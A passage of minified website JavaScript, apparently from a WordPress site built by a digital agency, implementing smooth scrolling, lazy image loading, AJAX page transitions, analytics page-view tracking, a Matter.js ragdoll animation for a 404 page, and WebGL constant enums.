title"),this.$body=$(document.body),this.$mainCont=$(document.getElementById("main_container")),this.$pageWrap=$(document.getElementById("page_wrapper"))}_initEl(){Jh.init(this.$html),eu.init(this.$window,this.$body,this.$pageWrap),pu.init(this.$window),iu.init(this.$window,eu.cX,eu.cY),ou.init()}_bindEvents(){eu.on(eu.E.RESIZE,this._resize,this),gsap.ticker.add((()=>this._raf()))}_initStaticViews(){this.emit(this.E.INIT_STATIC_VIEW),cu.checkCookiesAccepted()}_resize(t=!1){this.INERTIA=Jh.IS_TOUCH?.15:.09}_raf(){au.rafStart(),this.emit(this.E.RAF),au.rafEnd()}},pu=new class extends Qh{constructor(){super(),this.IS_SMOOTH=!0,this.E={SCROLL_COMPLETE:"scrollcomplete"},this.smooth=null,this.y=null,this.yI=null,this.v=null}init(t=$(window)){this._initDOM(t),this._initEl(),this._bindEvents(),this._disableScrollRestoration()}_initDOM(t){this.$window=t}_initEl(){}_bindEvents(){du.on(du.E.RAF,this._raf,this),eu.on(eu.E.RESIZE,this._resize,this)}_disableScrollRestoration(){"scrollRestoration"in history&&(history.scrollRestoration="manual")}_resize(){this.smooth&&ScrollTrigger.refresh(!0)}_raf(){this.y=this.$window[0].scrollY}initSmooth(t,e){this.smooth&&this.smooth.kill(),this.smooth=ScrollSmoother.create({wrapper:t,content:e,smooth:this.IS_SMOOTH?2:0,normalizeScroll:!1,ignoreMobileResize:!0,effects:!0,onUpdate:this._onSmoothUpdate.bind(this),onStop:this._onSmoothStop.bind(this)}),this.pauseSmooth()}resize(){this._resize()}_onSmoothUpdate(t){this._updateProps(t)}_onSmoothStop(t){this._updateProps(t,!0)}_updateProps(t,e=!1){"number"==typeof t?(this.yI=Math.round(t),this.v=0):(this.yI=e?Math.round(t.scrollTop()):t.scrollTop(),this.v=t.getVelocity())}pauseSmooth(t=!0){this.smooth&&this.smooth.paused(t)}killSmooth(){this.smooth&&this.smooth.kill()}scrollTo(t,e="default",i="top 199px",r=1,n="power3.inOut",s=!1){this.smooth&&("default"===e?(this._updateProps(t),this.smooth.scrollTop(t),this._resize()):"smooth"===e?this.smooth.scrollTo(t,!0,i):"ease"===e&&(this.tw.scrollTo=gsap.to(this.smooth,{scrollTop:t,duration:r,ease:n,onComplete:()=>{s&&this.emit(this.E.SCROLL_COMPLETE)}})))}};class fu{static Deferred(){return new function(){this.resolve=null,this.reject=null,this.promise=new Promise(((t,e)=>{this.resolve=t,this.reject=e}))}}static trim(t,e,i){if(i=i||"g","string"!=typeof t||"string"!=typeof e||"string"!=typeof i)throw new TypeError("argument must be string");if(!/^[gi]*$/.test(i))throw new TypeError("Invalid flags supplied '"+i.match(new RegExp("[^gi]*"))+"'");return e=e.replace(/[\[\](){}?*+\^$\\.|\-]/g,"\\$&"),t.replace(new RegExp("^["+e+"]+|["+e+"]+$",i),"")}static findParent(t,e){for(;e;){if((e.nodeName||e.tagName).toLowerCase()===t.toLowerCase())return e;e=e.parentNode}return null}static isFunction(t){return t&&"[object Function]"==={}.toString.call(t)}static offset(t){let e=t.getBoundingClientRect();return{top:e.top+pu.yI,left:e.left+pu.xI}}static shuffle(t){let e,i,r=t.length;for(;0!==r;)i=Math.floor(Math.random()*r),r-=1,e=t[r],t[r]=t[i],t[i]=e;return t}static wrap(t,e){t.parentNode.insertBefore(e,t),e.appendChild(t)}static wrapInner(t,e){for(t.appendChild(e);t.firstChild!==e;)e.appendChild(t.firstChild)}static closestValueInArray(t,e){let i=e[0],r=Math.abs(t-i);for(let n=0;n<e.length;n++){let s=Math.abs(t-e[n]);s<r&&(r=s,i=e[n])}return i}static closestIndexInArray(t,e){let i=e[0],r=0,n=Math.abs(t-i);for(let s=0;s<e.length;s++){let o=Math.abs(t-e[s]);o<n&&(n=o,i=e[s],r=s)}return r}static getPointOnCircle(t,e,i,r){return{x:i*Math.cos(r)+t,y:i*Math.sin(r)+e}}static getPointOnEllipse(t,e,i,r,n){return{x:t+i*Math.cos(n),y:e+r*Math.sin(n)}}static shadeBlendConvert(t,e,i){function r(t,e){var i=t.length,r={};if(i>9){if((t=t.split(",")).length<3||t.length>4)return null;r[0]=e(t[0].slice(4)),r[1]=e(t[1]),r[2]=e(t[2]),r[3]=t[3]?parseFloat(t[3]):-1}else{if(8===i||6===i||i<4)return null;i<6&&(t="#"+t[1]+t[1]+t[2]+t[2]+t[3]+t[3]+(i>4?t[4]+""+t[4]:"")),t=e(t.slice(1),16),r[0]=t>>16&255,r[1]=t>>8&255,r[2]=255&t,r[3]=9==i||5==i?s((t>>24&255)/255*1e4)/1e4:-1}return r}if("number"!=typeof t||t<-1||t>1||"string"!=typeof e||"r"!==e[0]&&"#"!==e[0]||"string"!=typeof i&&void 0!==i)return null;let n=parseInt,s=Math.round,o=e.length>9,a=t<0,h=a?-1*t:t,u=i&&"c"!==i?i:a?"#000000":"#FFFFFF",l=r(e,n),c=r(u,n);return o="string"==typeof u?u.length>9||"c"===u&&!o:o,l&&c?o?"rgb("+s((c[0]-l[0])*h+l[0])+","+s((c[1]-l[1])*h+l[1])+","+s((c[2]-l[2])*h+l[2])+(l[3]<0&&c[3]<0?")":","+(l[3]>-1&&c[3]>-1?s(1e4*((c[3]-l[3])*h+l[3]))/1e4:c[3]<0?l[3]:c[3])+")"):"#"+(4294967296+16777216*(l[3]>-1&&c[3]>-1?s(255*((c[3]-l[3])*h+l[3])):c[3]>-1?s(255*c[3]):l[3]>-1?s(255*l[3]):255)+65536*s((c[0]-l[0])*h+l[0])+256*s((c[1]-l[1])*h+l[1])+s((c[2]-l[2])*h+l[2])).toString(16).slice(l[3]>-1||c[3]>-1?1:3):null}static curveThroughPoints(t,e){let i,r,n,s,o,a;for(i=1,r=t.length-2;i<r;i++)n=t[i],s=t[i+1],o=.5*(n.x+s.x),a=.5*(n.y+s.y),e.quadraticCurveTo(n.x,n.y,o,a);n=t[i],s=t[i+1],e.quadraticCurveTo(n.x,n.y,s.x,s.y)}}const gu=new class{constructor(){}init(){const t=fu.Deferred();return this._setConfig(),this._setEnvVar(),this._setDebug(),this._showCreditsLog(),t.resolve(),t.promise}_setConfig(){for(const t in GRH_Config)this[t]=GRH_Config[t]}_setEnvVar(){this.IS_DEV="true"==this.IS_DEV,this.IS_PREPROD="true"==this.IS_PREPROD,this.IS_PROD="true"==this.IS_PROD}_setDebug(){this.DEBUG={},this.DEBUG.FPS_STATS=!0,this.DEBUG.MEMORY_STATS=!1,this.DEBUG.DEBUG_STATS=!1,this.DEBUG.IS_NEEDED=this._isDebugControllerNeeded()}_isDebugControllerNeeded(){let t=!1;for(const e in this.DEBUG)if(this.DEBUG[e]){t=!0;break}return t}_showCreditsLog(){const t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e="padding: 0px; color:"+(t?"#FFFFFF":"#000000")+"; line-height:30px; font-size: 18px; font-family: georgia, serif; font-style: italic;",i="padding: 0px; color:"+(t?"#FFFFFF":"#000000")+'; line-height:20px; font-size: 12px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen-Sans", "Ubuntu", "Cantarell", "Helvetica Neue", sans-serif;';"fr"===this.CURRENT_LANG?console.log("%c\n\nwww.lesanimals.digital\n%cAgence digitale sensiblement différente\n\n",e,i):"en"===this.CURRENT_LANG&&console.log("%c\n\nwww.lesanimals.digital\n%cSlightly different digital agency\n\n",e,i)}};var mu=i(732),vu=i.n(mu);class _u extends ru{constructor(t,e=".img_lazy",i={}){super(),this.E={FILE_LOADING:"fileloading",FILE_LOADED:"fileloaded",LOAD_COMPLETE:"loadcomplete"},this.$container=t,this.SELECTOR=e,this.lazyloader=null,this.options=i,this._setOptions(),this.options.autoInit&&this.init()}_setOptions(){this.options=Object.assign({autoInit:!0,fileLoading:!1,fileLoaded:!1,loadComplete:!1},this.options)}initEl(){this._initLazyloader()}_initLazyloader(){this.lazyloader=new(vu())({container:this.$container[0],elements_selector:this.SELECTOR,class_loaded:"img_loaded",callback_loading:this._onFileLoading.bind(this),callback_loaded:this._onFileLoaded.bind(this),callback_finish:this._onLoadComplete.bind(this)})}_onFileLoading(t){this.options.fileLoading&&this.emit(this.E.FILE_LOADING,t)}_onFileLoaded(t){$(t).parents(".img_lazy_container")[0].classList.add("img_loaded"),this.options.fileLoaded&&this.emit(this.E.FILE_LOADED,t)}_onLoadComplete(){this.options.loadComplete&&this.emit(this.E.LOAD_COMPLETE)}bindEvents(){this.eh.forceLoadImages=this.update.bind(this),this.$container.on("forceLoadImages",this.eh.forceLoadImages)}unbindEvents(){this.$container.off("forceLoadImages",this.eh.forceLoadImages)}update(){this.lazyloader&&this.lazyloader.update()}loadAll(){this.lazyloader&&this.lazyloader.loadAll()}destroy(){super.destroy(),this.lazyloader.destroy()}}class yu extends ru{constructor(){super(),this.E={ASSETS_LOADING_COMPLETE:"assetsloadingcomplete"},this.assetsToLoad=null}init(t=null,e){super.init(t,e),this.initSmoothScroll()}initDOM(t){this.$pageCont=t,this.$content=this.$pageCont.find(".page_content")}initEl(t=null){this.transState=t,this.lazyloader=new _u(this.$pageCont)}initTl(){}show(t=null,e=0,i,r){return this.df.show=fu.Deferred(),this.playShow(t,e,i,r),this.df.show.promise}playShow(t,e,i,r){this.onShowComplete()}onShowComplete(){this.df.show.resolve()}hide(t=null,e=0,i){return this.df.hide=fu.Deferred(),this.playHide(t,e,i),this.df.hide.promise}playHide(t,e,i){this.onHideComplete()}onHideComplete(){this.df.hide.resolve()}initSmoothScroll(){pu.initSmooth(this.$pageCont[0],this.$content[0])}updateSearch(){console.log("search updated")}updateHash(){console.log("hash updated")}destroy(){this.lazyloader&&this.lazyloader.destroy(),super.destroy()}}const xu=new class{updateMO(t){if(!gu.IS_PROD)return;let e=t.url,i=t.previousUrl;_paq.push(["setReferrerUrl",i]),_paq.push(["setCustomUrl",e]),_paq.push(["setDocumentTitle",t.title]),_paq.push(["deleteCustomVariables","page"]),_paq.push(["trackPageView"]);let r=document.querySelector("html");_paq.push(["MediaAnalytics::scanForMedia",r]),_paq.push(["FormAnalytics::scanForForms",r]),_paq.push(["trackContentImpressionsWithinNode",r]),_paq.push(["enableLinkTracking"])}};class Eu{static removeFirstSpecificChar(t,e){return t.substr(0,1)==e&&(t=t.substr(1)),t}static removeLastSpecificChar(t,e){return t.substr(t.length-1,1)==e&&(t=t.substr(0,t.length-1)),t}static strip(t,e){for(let i=0;i<e.length;i++){const r=e[i];if(0===t.indexOf(r))return t.replace(r,"")}return t}static convertToUrl(t){const e=document.createElement("a");return e.href=t,e}static removeProtocol(t){return this.strip(t,["http:","https:"])}static getPath(t,e){let i=t.replace(e,"");return i=i.split("#")[0],i=i.split("?")[0],i=this.removeFirstSpecificChar(i,"/"),i=this.removeLastSpecificChar(i,"/"),i}static getSearch(t){let e=this.convertToUrl(t).search.split("?")[1]||"";return e=this.removeFirstSpecificChar(e,"/"),e=this.removeLastSpecificChar(e,"/"),e}static getHash(t){let e=this.convertToUrl(t).hash.split("#")[1]||"";return e=this.removeFirstSpecificChar(e,"/"),e=this.removeLastSpecificChar(e,"/"),e}static getSearchParams(t){const e=this.convertToUrl(t),i={};if(e.search.length>1)for(let t,r=0,n=e.search.substr(1).split("&");r<n.length;r++){t=n[r].split("=");let e=decodeURI(t[0]);e=this.removeFirstSpecificChar(e,"/"),e=this.removeLastSpecificChar(e,"/");let s=t.length>1?decodeURI(t[1]):"";s=this.removeFirstSpecificChar(s,"/"),s=this.removeLastSpecificChar(s,"/"),i[e]=s}return i}static getHashParams(t){const e=this.convertToUrl(t);let i=[];if(e.hash.length>1){let t=decodeURI(e.hash.substr(1));t=this.removeFirstSpecificChar(t,"/"),t=this.removeLastSpecificChar(t,"/"),i=t.split("/")}return i}static getUrlInfos(t,e){const i={};return i.base=e,i.full=this.removeProtocol(t),i.path=this.getPath(i.full,this.removeProtocol(e)),i.pathParams=i.path.split("/"),i.search=this.getSearch(i.full),i.searchParams=this.getSearchParams(i.full),i.hash=this.getHash(i.full),i.hashParams=this.getHashParams(i.full),i}}const bu=new class extends Qh{constructor(){super(),this.E={UPDATE_DOM:"updatedom"},this.pages={},this.infos={},this.isFirstLoad=!0,this.isFreezed=!0,this.isLoading=!0,this.nextUrlToLoad=null,this.prev={},this.current={}}addPage(t,e){this.pages[t]=e}init(){this._initDOM(),this._initEl()}_initDOM(){this.$adminBar=$(document.getElementById("wpadminbar"))}_initEl(){this.hasAdmin=this.$adminBar.length>0}changePage(t,e){this.isFirstLoad||!this.isFreezed?(this.freezed=!0,this.loading=!0,this.prev.url=this.current.url||null,this.current.url=t,this.isFirstLoad?(this._initStaticViews(),this._setView(du.$pageWrap),this._setInfos(this.prev.id,this.current.id),this.current.page.init(this.current.$dom,this.infos.transState),this.deletePrevious(),this.hideTransition(),this.isFirstLoad=!1):(e&&history.pushState({},null,this.current.url),this._loadPage(t))):this.nextUrlToLoad=t}_initStaticViews(){}_setView(t){this.prev.id=this.current.id||null,this.prev.page=this.current.page||null,this.prev.$dom=this.current.$dom||null,this.current.$dom=t.find(".page_container"),this.current.id=this.current.$dom[0].getAttribute("data-view-id"),void 0===this.pages[this.current.id]?this.current.page=new yu:this.current.page=new this.pages[this.current.id]}_setInfos(t,e){this.infos={transState:this._getTransitionState(t,e)}}_getTransitionState(t,e){return"default"}_loadPage(t){this.isSubpage=this._getSubpageChange(this.prev.url,this.current.url),Promise.all([su.in(this.isFirstLoad,this.infos,this.current,this.prev,this.isSubpage),this._ajaxLoad(t)]).then((()=>{pu.scrollTo(0),this._updateContent("add-current"),this.current.page.init(this.current.$dom,this.infos.transState),this.deletePrevious(),this.hideTransition()}))}_getSubpageChange(t,e){const i=Eu.getUrlInfos(t,gu.SITE_URL),r=Eu.getUrlInfos(e,gu.SITE_URL);return i.pathParams[0]===r.pathParams[0]}_ajaxLoad(t){const e=fu.Deferred(),i=new XMLHttpRequest;return i.open("GET",t,!0),i.onload=()=>{this._onAjaxLoadComplete(e,$(i.response))},i.responseType="document",i.send(),e.promise}_onAjaxLoadComplete(t,e){this._setView(e),this._setInfos(this.prev.id,this.current.id),this._updateDom(e),t.resolve()}_updateDom(t){this._updateAdmin(t),this._updateGlobal(t),this._updateMenuClass("#main_menu li",t),this._updateLangLink(".lang-item a",t),this.emit(this.E.UPDATE_DOM)}_updateAdmin(t){this.hasAdmin&&(this.$adminBar[0].innerHTML=t.find("#wpadminbar")[0].innerHTML)}_updateGlobal(t){du.$body[0].className=t[0].body.className,du.$title[0].innerHTML=t[0].title}_updateMenuClass(t,e){const i=du.$mainCont.find(t),r=e.find(t);for(let t=0;t<i.length;t++)i[t].className=r[t].className}_updateLangLink(t,e){const i=du.$mainCont.find(t),r=e.find(t);for(let t=0;t<i.length;t++)i[t].href=r[t].href}deletePrevious(){this.isFirstLoad||(this._destroyPage(),this._updateContent("remove-prev"))}hideTransition(){su.out(this.isFirstLoad,this.infos,this.current,this.prev,this.isSubpage).then((()=>{this._onTransitionComplete()}))}_onTransitionComplete(){this.current.page.isInit=!0,this.loading=!1,this.freezed=!1,this._checkUrl()}_updateContent(t){"add-current"===t?(du.$pageWrap[0].classList.add("transition"),du.$pageWrap.append(this.current.$dom)):"remove-prev"===t&&(this.prev.$dom.remove(),du.$pageWrap[0].classList.remove("transition"))}_destroyPage(){this.prev.page&&(this.prev.page.destroy(),this.prev.page.isInit=!1,this.prev.page=null)}_checkUrl(){if(this.nextUrlToLoad)this._loadPage(this.nextUrlToLoad,!1),this.nextUrlToLoad=null;else{const t={previousUrl:this.prev.url,url:this.current.url,title:du.$title[0].innerHTML};xu.updateMO(t)}}updateSearch(){this.current.page.updateSearch()}updateHash(){this.current.page.updateHash()}set isFreezed(t){this._isFreezed=t}get isFreezed(){return this._isFreezed}set nextUrlToLoad(t){this._nextUrlToLoad=t}get nextUrlToLoad(){return this._nextUrlToLoad}set freezed(t){t?(du.$html[0].classList.add("freezed"),this.isFreezed=!0):(this.isFreezed=!1,du.$html[0].classList.remove("freezed"))}set loading(t){t?(du.$html[0].classList.add("loading"),this.isLoading=!0):(this.isLoading=!1,du.$html[0].classList.remove("loading"))}},Tu=new class extends Qh{constructor(){super(),this.currentUrl=null,this.lastTrackedUrl=null}init(){bu.init(),this._bindEvents(),this._changePage(window.location.href,!1)}_bindEvents(){du.$window.on("popstate",this._onPopState.bind(this)),du.$window.on("hashchange",this._onHashChange.bind(this)),du.$window.on("click",this._clickHandler.bind(this))}_changePage(t,e){this.currentUrl=t,bu.changePage(this.currentUrl,e)}_clickHandler(t){const e=fu.findParent("a",t.target);if(!e)return;const i=e.getAttribute("href"),r=Eu.getUrlInfos(this.currentUrl,gu.SITE_URL),n=Eu.getUrlInfos(i,gu.SITE_URL),s=this._setUrlPartChange(r,n),o=this._clickTester(t,e);o&&s.isPageChange?(t.preventDefault(),this._changePage(i,!0)):o&&s.isSearchChange&&(t.preventDefault(),this.currentUrl=i,history.pushState({},null,this.currentUrl),this._changeSearch())}_clickTester(t,e){const i=e.getAttribute("href");return!(!window.history.pushState||t.which>1||t.metaKey||t.ctrlKey||t.shiftKey||t.altKey||e.target&&"_blank"===e.target||window.location.protocol!==e.protocol||window.location.hostname!==e.hostname||i.indexOf(Eu.removeProtocol(gu.SITE_URL))<0||"string"==typeof e.getAttribute("download")||(fu.trim(this.currentUrl,"/")===fu.trim(i,"/")?(t.preventDefault(),1):"#"===i.substring(0,1)||i.match(/[^/]+(jpg|jpeg|png|gif|pdf|doc|docx|xls|xlsx)$/)||e.hasAttribute("data-no-ajax")||(e.classList&&(e.classList.contains("lesanimals-ajax-navigation-next-button")||e.classList.contains("lesanimals-ajax-navigation-previous-button"))?(t.preventDefault(),1):i.indexOf("wp-admin")>0||i.indexOf("wp-login")>0||bu.isFreezed&&(t.preventDefault(),bu.nextUrlToLoad=i,1))))}_setUrlPartChange(t,e){return{isPageChange:t.path!=e.path,isSearchChange:t.search!=e.search,isHashChange:t.hash!=e.hash}}_onPopState(t){const e=window.location.href,i=Eu.getUrlInfos(this.currentUrl,gu.SITE_URL),r=Eu.getUrlInfos(e,gu.SITE_URL),n=this._setUrlPartChange(i,r);n.isPageChange?this._changePage(e,!1):n.isSearchChange&&(this.currentUrl=e,this._changeSearch())}_onHashChange(){const t=window.location.href,e=Eu.getUrlInfos(this.currentUrl,gu.SITE_URL),i=Eu.getUrlInfos(t,gu.SITE_URL),r=this._setUrlPartChange(e,i);!r.isHashChange||r.isPageChange||r.isSearchChange||(this.currentUrl=t,this._changeHash())}_changeSearch(){bu.updateSearch()}_changeHash(){bu.updateHash()}};class Du extends yu{constructor(){super()}}var wu=i(334),Su=i.n(wu);class Au extends ru{constructor(t){super(),b().use(Su()),this.$wrapper=t,this.debug=!1,this.numRagdolls=40,this.maxForce=0,this.init()}initEl(){super.initEl(),this.initMatter()}initMatter(){this.matterWidth=eu.wW,this.matterHeight=eu.wH,this.engine=b().Engine.create(),this.world=this.engine.world,this.engine.gravity.y=.15,this.engine.gravity.x=.08,this.render=b().Render.create({element:this.$wrapper[0],engine:this.engine,options:{background:"transparent",wireframeBackground:"transparent",wireframes:!1,width:this.matterWidth,height:this.matterHeight,pixelRatio:1,enabled:!0}}),b().Render.run(this.render)}bindEvents(){du.on(du.E.RAF,this.raf,this),eu.on(eu.E.RESIZE,this.resize,this),this.onBeforeUpdateHandler=this.onBeforeUpdate.bind(this),b().Events.on(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.bindEvents()}unbindEvents(){du.off(du.E.RAF,this.raf,this),eu.off(eu.E.RESIZE,this.resize,this),b().Events.off(this.engine,"beforeUpdate",this.onBeforeUpdateHandler),super.unbindEvents()}resize(t){t||(this.maxForce=2e-8*eu.wW,this.render.canvas.width=this.render.canvas.offsetWidth,this.render.canvas.height=this.render.canvas.offsetHeight,this.killRagdolls(),this.createRagDolls())}raf(){b().Engine.update(this.engine,1e3/60)}onBeforeUpdate(){if(this.ragdolls&&this.ragdolls.composites)for(let t=0;t<this.ragdolls.composites.length;t++){const e=b().Vector.create(b().Common.random(-this.maxForce,this.maxForce),b().Common.random(-this.maxForce,this.maxForce));for(let i=0;i<this.ragdolls.composites[t].bodies.length;i++){const r=this.ragdolls.composites[t].bodies[i];b().Body.applyForce(r,{x:0,y:0},e)}}}createRagDolls(){this.ragdolls=b().Composite.create();for(let t=0;t<this.numRagdolls;t++){const e=Math.random()*eu.wW,i=Math.random()*eu.wH,r=this.ragdoll(t/this.numRagdolls,e,i,tu.clamp(eu.wW/1280,.3,1));b().Composite.add(this.ragdolls,r),b().Composite.rotate(r,2*Math.PI*Math.random(),{x:e,y:i},!0)}b().Composite.add(this.world,[this.ragdolls])}ragdoll(t=0,e=0,i=0,r=1){const n=b().Bodies,s=b().Constraint,o=b().Composite,a=b().Common,h=b().Body.nextCategory(),u=32+11*t,l={isStatic:!1,render:{fillStyle:"rgb("+u+","+u+","+(32+194*t)+")"}},c=90,d=20,p=60,f=60,g=15,m=135,v=a.extend({label:"head",collisionFilter:this.getCollisionFilter(h)},l),_=a.extend({label:"chest",collisionFilter:this.getCollisionFilter(h),chamfer:{radius:[20*r,20*r,20*r,20*r]}},l),y=a.extend({label:"left-arm",collisionFilter:this.getCollisionFilter(h),chamfer:{radius:10*r}},l),x=a.extend({chamfer:{radius:10*r}},y),E=a.extend({label:"right-arm",collisionFilter:this.getCollisionFilter(h),chamfer:{radius:10*r}},l),T=a.extend({chamfer:{radius:10*r}},E),D=a.extend({label:"left-leg",collisionFilter:this.getCollisionFilter(h),chamfer:{radius:10*r}},l),w=a.extend({collisionFilter:this.getCollisionFilter(h)},D),S=a.extend({label:"right-leg",collisionFilter:this.getCollisionFilter(h),chamfer:{radius:10*r}},l),A=a.extend({collisionFilter:this.getCollisionFilter(h)},S),C=n.circle(e+0*r,i+-7*r,20*r,v),I=n.rectangle(e+0*r,i+60*r,55*r,c*r,_),R=n.rectangle(e+35*r,i+65*r,d*r,p*r,E),P=n.rectangle(e+35*r,i+125*r,d*r,p*r,T),O=n.rectangle(e-35*r,i+65*r,d*r,p*r,y),N=n.rectangle(e-35*r,i+125*r,d*r,p*r,x),M=n.rectangle(e+g*r,i+m*r,20*r,f*r,D),F=n.rectangle(e+g*r,i+195*r,20*r,f*r,w),L=n.rectangle(e-g*r,i+m*r,20*r,f*r,S),B=n.rectangle(e-g*r,i+195*r,20*r,f*r,A),U=!1,k=s.create({bodyA:C,bodyB:I,pointA:{x:0,y:20*r},pointB:{x:0,y:-45*r},length:0,stiffness:.6,render:{visible:U}}),G=s.create({bodyA:I,bodyB:R,pointA:{x:27.5*r,y:-30*r},pointB:{x:-10*r,y:-30*r},length:0,stiffness:1,render:{visible:U}}),H=s.create({bodyA:I,bodyB:O,pointA:{x:-27.5*r,y:-30*r},pointB:{x:10*r,y:-30*r},length:0,stiffness:1,render:{visible:U}}),z=s.create({bodyA:I,bodyB:M,pointA:{x:g*r,y:45*r},pointB:{x:0,y:-30*r},stiffness:1,render:{visible:U}}),V=s.create({bodyA:I,bodyB:L,pointA:{x:-g*r,y:45*r},pointB:{x:0,y:-30*r},stiffness:1,render:{visible:U}}),X=s.create({bodyA:R,bodyB:P,pointA:{x:0,y:24*r},pointB:{x:0,y:-24*r},length:0,stiffness:.9,render:{visible:U}}),j=s.create({bodyA:O,bodyB:N,pointA:{x:0,y:24*r},pointB:{x:0,y:-24*r},length:0,stiffness:.9,render:{visible:U}}),$=s.create({bodyA:M,bodyB:F,pointA:{x:0,y:24*r},pointB:{x:0,y:-24*r},length:0,stiffness:.9,render:{visible:U}}),W=s.create({bodyA:L,bodyB:B,pointA:{x:0,y:24*r},pointB:{x:0,y:-24*r},length:0,stiffness:.9,render:{visible:U}}),Y=s.create({bodyA:F,bodyB:B,stiffness:.01,render:{visible:U}}),q=o.create({bodies:[I,C,N,O,P,R,F,B,M,L],constraints:[j,X,H,G,k,$,W,z,V,Y]});return q.plugin.wrap={min:{x:0,y:0},max:{x:eu.wW,y:eu.wH}},q}getCollisionFilter(t){return{group:b().Body.nextGroup(!0),mask:t,category:t}}killRagdolls(){this.ragdolls&&this.ragdolls.composites&&b().Composite.remove(this.world,this.ragdolls,!0)}destroy(){this.killRagdolls(),b().World.clear(this.engine.world),b().Engine.clear(this.engine),super.destroy()}}const Cu=new class{constructor(){bu.addPage("error_404",Du),ou.register("error_404_header",Au)}};class Iu extends yu{constructor(){super()}}class Ru{static linear(t){return t}static easeInQuad(t){return t*t}static easeOutQuad(t){return t*(2-t)}static easeInOutQuad(t){return t<.5?2*t*t:(4-2*t)*t-1}static easeInCubic(t){return t*t*t}static easeOutCubic(t){return--t*t*t+1}static easeInOutCubic(t){return t<.5?4*t*t*t:(t-1)*(2*t-2)*(2*t-2)+1}static easeInQuart(t){return t*t*t*t}static easeOutQuart(t){return 1- --t*t*t*t}static easeInOutQuart(t){return t<.5?8*t*t*t*t:1-8*--t*t*t*t}static easeInQuint(t){return t*t*t*t*t}static easeOutQuint(t){return 1+--t*t*t*t*t}static easeInOutQuint(t){return t<.5?16*t*t*t*t*t:1+16*--t*t*t*t*t}}var Pu,Ou,Nu,Mu,Fu,Lu,Bu,Uu,ku,Gu,Hu,zu,Vu,Xu,ju,$u,Wu,Yu,qu,Zu;!function(t){t[t.WEBGL_LEGACY=0]="WEBGL_LEGACY",t[t.WEBGL=1]="WEBGL",t[t.WEBGL2=2]="WEBGL2"}(Pu||(Pu={})),function(t){t[t.UNKNOWN=0]="UNKNOWN",t[t.WEBGL=1]="WEBGL",t[t.CANVAS=2]="CANVAS"}(Ou||(Ou={})),function(t){t[t.COLOR=16384]="COLOR",t[t.DEPTH=256]="DEPTH",t[t.STENCIL=1024]="STENCIL"}(Nu||(Nu={})),function(t){t[t.NORMAL=0]="NORMAL",t[t.ADD=1]="ADD",t[t.MULTIPLY=2]="MULTIPLY",t[t.SCREEN=3]="SCREEN",t[t.OVERLAY=4]="OVERLAY",t[t.DARKEN=5]="DARKEN",t[t.LIGHTEN=6]="LIGHTEN",t[t.COLOR_DODGE=7]="COLOR_DODGE",t[t.COLOR_BURN=8]="COLOR_BURN",t[t.HARD_LIGHT=9]="HARD_LIGHT",t[t.SOFT_LIGHT=10]="SOFT_LIGHT",t[t.DIFFERENCE=11]="DIFFERENCE",t[t.EXCLUSION=12]="EXCLUSION",t[t.HUE=13]="HUE",t[t.SATURATION=14]="SATURATION",t[t.COLOR=15]="COLOR",t[t.LUMINOSITY=16]="LUMINOSITY",t[t.NORMAL_NPM=17]="NORMAL_NPM",t[t.ADD_NPM=18]="ADD_NPM",t[t.SCREEN_NPM=19]="SCREEN_NPM",t[t.NONE=20]="NONE",t[t.SRC_OVER=0]="SRC_OVER",t[t.SRC_IN=21]="SRC_IN",t[t.SRC_OUT=22]="SRC_OUT",t[t.SRC_ATOP=23]="SRC_ATOP",t[t.DST_OVER=24]="DST_OVER",t[t.DST_IN=25]="DST_IN",t[t.DST_OUT=26]="DST_OUT",t[t.DST_ATOP=27]="DST_ATOP",t[t.ERASE=26]="ERASE",t[t.SUBTRACT=28]="SUBTRACT",t[t.XOR=29]="XOR"}(Mu||(Mu={})),function(t){t[t.POINTS=0]="POINTS",t[t.LINES=1]="LINES",t[t.LINE_LOOP=2]="LINE_LOOP",t[t.LINE_STRIP=3]="LINE_STRIP",t[t.TRIANGLES=4]="TRIANGLES",t[t.TRIANGLE_STRIP=5]="TRIANGLE_STRIP",t[t.TRIANGLE_FAN=6]="TRIANGLE_FAN"}(Fu||(Fu={})),function(t){t[t.RGBA=6408]="RGBA",t[t.RGB=6407]="RGB",t[t.RG=33319]="RG",t[t.RED=6403]="RED",t[t.RGBA_INTEGER=36249]="RGBA_INTEGER",t[t.RGB_INTEGER=36248]="RGB_INTEGER",t[t.RG_INTEGER=33320]="RG_INTEGER",t[t.RED_INTEGER=36244]="RED_INTEGER",t[t.ALPHA=6406]="ALPHA",t[t.LUMINANCE=6409]="LUMINANCE",t[t.LUMINANCE_ALPHA=6410]="LUMINANCE_ALPHA",t[t.DEPTH_COMPONENT=6402]="DEPTH_COMPONENT",t[t.DEPTH_STENCIL=34041]="DEPTH_STENCIL"}(Lu||(Lu={})),function(t){t[t.TEXTURE_2D=3553]="TEXTURE_2D",t[t.TEXTURE_CUBE_MAP=34067]="TEXTURE_CUBE_MAP",t[t.TEXTURE_2D_ARRAY=35866]="TEXTURE_2D_ARRAY",t[t.TEXTURE_CUBE_MAP_POSITIVE_X=34069]="TEXTURE_CUBE_MAP_POSITIVE_X",t[t.TEXTURE_CUBE_MAP_NEGATIVE_X=34070]="TEXTURE_CUBE_MAP_NEGATIVE_X",t[t.TEXTURE_CUBE_MAP_POSITIVE_Y=34071]="TEXTURE_CUBE_MAP_POSITIVE_Y",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Y=34072]="TEXTURE_CUBE_MAP_NEGATIVE_Y",t[t.TEXTURE_CUBE_MAP_POSITIVE_Z=34073]="TEXTURE_CUBE_MAP_POSITIVE_Z",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Z=34074]="TEXTURE_CUBE_MAP_NEGATIVE_Z"}(Bu||(Bu={})),function(t){t[t.UNSIGNED_BYTE=5121]="UNSIGNED_BYTE",t[t.UNSIGNED_SHORT=5123]="UNSIGNED_SHORT",t[t.UNSIGNED_SHORT_5_6_5=33635]="UNSIGNED_SHORT_5_6_5",t[t.UNSIGNED_SHORT_4_4_4_4=32819]="UNSIGNED_SHORT_4_4_4_4",t[t.UNSIGNED_SHORT_5_5_5_1=32820]="UNSIGNED_SHORT_5_5_5_1",t[t.UNSIGNED_INT=5125]="UNSIGNED_INT",t[t.UNSIGNED_INT_10F_11F_11F_REV=35899]="UNSIGNED_INT_10F_11F_11F_REV",t[t.UNSIGNED_INT_2_10_10_10_REV=33640]="UNSIGNED_I